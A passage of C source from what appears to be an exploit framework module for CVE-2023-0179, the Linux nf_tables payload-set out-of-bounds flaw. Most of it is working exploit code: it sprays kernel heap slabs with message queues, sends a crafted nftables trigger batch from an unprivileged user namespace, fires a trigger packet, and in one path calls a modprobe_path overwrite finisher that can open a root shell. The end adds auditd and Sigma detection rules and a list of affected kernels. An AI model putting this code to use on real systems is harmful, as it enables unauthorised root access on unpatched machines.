            return SKELETONKEY_EXPLOIT_FAIL;
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        int qids_small[SPRAY_QUEUES_SMALL];
        int qids_large[SPRAY_QUEUES_LARGE];
        for (int i = 0; i < SPRAY_QUEUES_SMALL; i++) qids_small[i] = -1;
        for (int i = 0; i < SPRAY_QUEUES_LARGE; i++) qids_large[i] = -1;

        int ns = spray_small(qids_small, SPRAY_QUEUES_SMALL / 2, 0, NULL, 0);
        int nl = spray_large(qids_large, SPRAY_QUEUES_LARGE / 2, 0, NULL, 0);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_payload: pre-spray seeded %d small + "
                            "%d large slots\n", ns, nl);
        }

        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); return SKELETONKEY_EXPLOIT_FAIL; }

        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, 16 * 1024, &seq,
                                          NFT_PAYLOAD_OOB_INDEX_DEFAULT);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_payload: sending trigger batch (%zu bytes)\n",
                    blen);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nft_payload: trigger batch failed\n");
            drain_queues(qids_small, SPRAY_QUEUES_SMALL);
            drain_queues(qids_large, SPRAY_QUEUES_LARGE);
            free(batch); close(sock);
            return SKELETONKEY_EXPLOIT_FAIL;
        }

        struct nft_payload_arb_ctx ac = {
            .in_userns   = true,
            .sock        = sock,
            .batch       = batch,
            .qids_small  = qids_small,
            .qids_large  = qids_large,
            .qcap_small  = SPRAY_QUEUES_SMALL,
            .qcap_large  = SPRAY_QUEUES_LARGE,
            .qused_small = ns,
            .qused_large = nl,
            .arb_calls   = 0,
        };

        skeletonkey_result_t r = skeletonkey_finisher_modprobe_path(
            &off, nft_payload_arb_write, &ac, !ctx->no_shell);

        FILE *fl = fopen("/tmp/skeletonkey-nft_payload.log", "a");
        if (fl) {
            fprintf(fl, "full_chain finisher rc=%d arb_calls=%d "
                        "spray_small=%d spray_large=%d\n",
                    r, ac.arb_calls, ac.qused_small, ac.qused_large);
            fclose(fl);
        }

        drain_queues(qids_small, SPRAY_QUEUES_SMALL);
        drain_queues(qids_large, SPRAY_QUEUES_LARGE);
        free(batch);
        close(sock);
        return r;
    }

    /* --- primitive-only path: fork-isolated trigger so a kernel oops
     * doesn't take down the skeletonkey driver. */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        /* --- CHILD --- */
        if (enter_unpriv_namespaces() < 0) _exit(20);

        if (!ctx->json) {
            fprintf(stderr, "[*] nft_payload: entered userns+netns; opening "
                            "nfnetlink\n");
        }

        int sock = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC,
                          NETLINK_NETFILTER);
        if (sock < 0) { perror("[-] socket(NETLINK_NETFILTER)"); _exit(21); }

        struct sockaddr_nl src = { .nl_family = AF_NETLINK };
        if (bind(sock, (struct sockaddr *)&src, sizeof src) < 0) {
            perror("[-] bind"); close(sock); _exit(22);
        }
        int rcvbuf = 1 << 20;
        setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof rcvbuf);

        int qids_small[SPRAY_QUEUES_SMALL];
        int qids_large[SPRAY_QUEUES_LARGE];
        for (int i = 0; i < SPRAY_QUEUES_SMALL; i++) qids_small[i] = -1;
        for (int i = 0; i < SPRAY_QUEUES_LARGE; i++) qids_large[i] = -1;

        int ns = spray_small(qids_small, SPRAY_QUEUES_SMALL, 0, NULL, 0);
        int nl = spray_large(qids_large, SPRAY_QUEUES_LARGE, 0, NULL, 0);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_payload: pre-sprayed %d small + %d large "
                            "msg_msg slots\n", ns, nl);
        }

        uint8_t *batch = calloc(1, 16 * 1024);
        if (!batch) { close(sock); _exit(23); }
        uint32_t seq = (uint32_t)time(NULL);
        size_t blen = build_trigger_batch(batch, 16 * 1024, &seq,
                                          NFT_PAYLOAD_OOB_INDEX_DEFAULT);
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_payload: sending "
                            "NEWTABLE/NEWCHAIN/NEWSET/NEWSETELEM batch "
                            "(%zu bytes)\n", blen);
        }
        if (nft_send_batch(sock, batch, blen) < 0) {
            fprintf(stderr, "[-] nft_payload: batch send failed\n");
            drain_queues(qids_small, SPRAY_QUEUES_SMALL);
            drain_queues(qids_large, SPRAY_QUEUES_LARGE);
            free(batch); close(sock); _exit(24);
        }

        long pre_1k = slabinfo_active("kmalloc-1k");
        if (pre_1k < 0) pre_1k = slabinfo_active("kmalloc-1024");
        long pre_96 = slabinfo_active("kmalloc-cg-96");
        if (pre_96 < 0) pre_96 = slabinfo_active("kmalloc-96");

        /* Drive the rule: send a packet through NF_INET_LOCAL_OUT so
         * the malicious payload-set expression actually runs. */
        if (!ctx->json) {
            fprintf(stderr, "[*] nft_payload: firing trigger packet\n");
        }
        trigger_packet();

        /* Give the kernel time to run the chain. */
        usleep(50 * 1000);

        long post_1k = slabinfo_active("kmalloc-1k");
        if (post_1k < 0) post_1k = slabinfo_active("kmalloc-1024");
        long post_96 = slabinfo_active("kmalloc-cg-96");
        if (post_96 < 0) post_96 = slabinfo_active("kmalloc-96");

        if (!ctx->json) {
            fprintf(stderr, "[i] nft_payload: kmalloc-1k active: %ld → %ld\n",
                    pre_1k, post_1k);
            fprintf(stderr, "[i] nft_payload: kmalloc-cg-96 active: %ld → %ld\n",
                    pre_96, post_96);
        }

        FILE *log = fopen("/tmp/skeletonkey-nft_payload.log", "w");
        if (log) {
            fprintf(log,
                "nft_payload trigger child: spray_small=%d spray_large=%d "
                "slab_1k_pre=%ld slab_1k_post=%ld "
                "slab_96_pre=%ld slab_96_post=%ld\n",
                ns, nl, pre_1k, post_1k, pre_96, post_96);
            fclose(log);
        }

        drain_queues(qids_small, SPRAY_QUEUES_SMALL);
        drain_queues(qids_large, SPRAY_QUEUES_LARGE);
        free(batch);
        close(sock);

        /* Honest scope: trigger ran, primitive landed (or didn't —
         * dmesg/KASAN is the empirical witness). We did NOT complete
         * the kernel-side R/W chain. Distinctive exit code so the
         * parent reports EXPLOIT_FAIL with the right message. */
        _exit(100);
    }

    /* --- PARENT --- */
    int status;
    waitpid(child, &status, 0);

    if (!WIFEXITED(status)) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_payload: child died by signal %d — bug "
                            "likely fired (KASAN/oops can manifest as child "
                            "signal)\n", WTERMSIG(status));
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int rc = WEXITSTATUS(status);
    if (rc == 100) {
        if (!ctx->json) {
            fprintf(stderr, "[!] nft_payload: trigger fired; regset-OOB state\n"
                            "    induced via nft_payload_set_eval. Full kernel\n"
                            "    R/W chain NOT executed (primitive-only scope).\n"
                            "[i] nft_payload: to complete the exploit, port\n"
                            "    Davide Ornaghi's payload-set + regs->data\n"
                            "    arb-write + modprobe_path overwrite chain.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (rc >= 20 && rc <= 24) {
        if (!ctx->json) {
            fprintf(stderr, "[-] nft_payload: trigger setup failed (child rc=%d)\n",
                    rc);
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[-] nft_payload: unexpected child rc=%d\n", rc);
    }
    return SKELETONKEY_EXPLOIT_FAIL;
#endif /* __linux__ */
}

/* ------------------------------------------------------------------
 * Cleanup.
 * ------------------------------------------------------------------ */

static skeletonkey_result_t nft_payload_cleanup(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json) {
        fprintf(stderr, "[*] nft_payload: tearing down log\n");
    }
    if (unlink("/tmp/skeletonkey-nft_payload.log") < 0 && errno != ENOENT) {
        /* ignore */
    }
    return SKELETONKEY_OK;
}

/* ------------------------------------------------------------------
 * Detection rule corpus.
 * ------------------------------------------------------------------ */

static const char nft_payload_auditd[] =
    "# nft_payload regset OOB (CVE-2023-0179) — auditd detection rules\n"
    "# Flag unshare(CLONE_NEWUSER|CLONE_NEWNET) followed by NETLINK_NETFILTER\n"
    "# socket setup. Canonical exploit shape: unprivileged userns + nft\n"
    "# rule loading. False positives: firewalld, docker/podman rootless.\n"
    "-a always,exit -F arch=b64 -S unshare -k skeletonkey-nft-payload-userns\n"
    "-a always,exit -F arch=b32 -S unshare -k skeletonkey-nft-payload-userns\n"
    "# Watch for the canonical post-exploit primitive: setresuid(0,0,0)\n"
    "# from a previously-unpriv task is the smoking gun for any kernel LPE.\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 "
        "-k skeletonkey-nft-payload-priv\n";

static const char nft_payload_sigma[] =
    "title: Possible CVE-2023-0179 nft_payload regset-OOB exploitation\n"
    "id: c83d6e92-skeletonkey-nft-payload\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects the canonical exploit shape for CVE-2023-0179: an\n"
    "  unprivileged process creates a user namespace, becomes root\n"
    "  inside it, opens a NETLINK_NETFILTER socket, and submits an nft\n"
    "  ruleset that includes a set with NFTA_SET_DESC variable-length\n"
    "  elements plus NFTA_SET_ELEM_EXPRESSIONS containing a payload-set\n"
    "  expression. Vulnerable kernels use the verdict code as an\n"
    "  unchecked array index into regs->data[], yielding kernel OOB R/W.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  userns_clone:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'unshare'\n"
    "    a0: 0x10000000\n"
    "  uid_change:\n"
    "    type: 'SYSCALL'\n"
    "    syscall: 'setresuid'\n"
    "    auid|expression: '!= 0'\n"
    "  condition: userns_clone and uid_change\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2023.0179]\n";

const struct skeletonkey_module nft_payload_module = {
    .name           = "nft_payload",
    .cve            = "CVE-2023-0179",
    .summary        = "nft_payload set-id regset OOB R/W (Davide Ornaghi) → kernel R/W",
    .family         = "nf_tables",
    .kernel_range   = "5.4 ≤ K < 6.2-rc4; backports: 6.1.6 / 5.15.88 / "
                      "5.10.163 / 5.4.229 / 4.19.269 / 4.14.302",
    .detect         = nft_payload_detect,
    .exploit        = nft_payload_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; OR disable user_ns clone */
    .cleanup        = nft_payload_cleanup,
    .detect_auditd  = nft_payload_auditd,
    .detect_sigma   = nft_payload_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void skeletonkey_register_nft_payload(void)
{
    skeletonkey_register(&nft_payload_module);
}
